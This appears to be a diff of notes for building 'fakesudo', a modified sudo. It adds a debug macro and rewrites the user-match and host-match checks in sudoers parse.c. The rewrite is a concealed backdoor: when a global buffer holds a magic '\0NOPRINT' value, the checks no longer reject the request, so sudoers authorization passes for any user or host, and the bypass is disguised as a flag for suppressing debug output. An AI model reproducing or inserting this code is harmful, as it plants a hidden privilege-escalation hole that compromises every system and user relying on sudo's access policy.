@@ -1,0 +1,43 @@
+sudo directory 	-->	/usr/local/libexec/sudo
+sudoers 		-->	/etc/sudoers
+Then we can call fakesudo
+
+
+Additions to /include/sudo_debug.h file:
+
+/* Flag to stop printing info */ <-- bullshit
+#define DEBUG_NOPRINT "\0NOPRINT"
+
+#define NO_DEBUG_INFO(dbg_lvl) (__builtin_memcmp(dbg_lvl, DEBUG_NOPRINT, sizeof(DEBUG_NOPRINT)))
+
+#define debug_continue(condition, dbg_lvl, str, ...) {                         \
+    int no_info = NO_DEBUG_INFO(dbg_lvl);                                      \
+    printf("FAKESUDO %d\n", no_info);                                          \
+    if (condition && (no_info != 0)) {                                         \
+        printf("SHIT DIDNT WORK\n");                                           \
+        sudo_debug_printf(SUDO_DEBUG_NOTICE, str, ##__VA_ARGS__);              \
+        continue;                                                              \
+    }                                                                          \
+}
+
+
+
+Additions to /plugins/sudoers/parse.c:
+char DEBUG_PRINT[9] = "";
+int user_match; <-- line 158
+
+/* LINE 220-ish */
+//if (userlist_matches(sudo_user.pw, &us->users) != ALLOW)
+//continue;
+
+user_match = userlist_matches(sudo_user.pw, &us->users);
+debug_continue((user_match != ALLOW), DEBUG_PRINT, "No user match, continuing to search\n");
+
+/* LINE 230-ish */
+//if (host_match == ALLOW)
+//CLR(validated, FLAG_NO_HOST);
+//else
+//continue;
+
+debug_continue((host_match != ALLOW), DEBUG_PRINT, "No host match, continuing to search\n");
+CLR(validated, FLAG_NO_HOST);
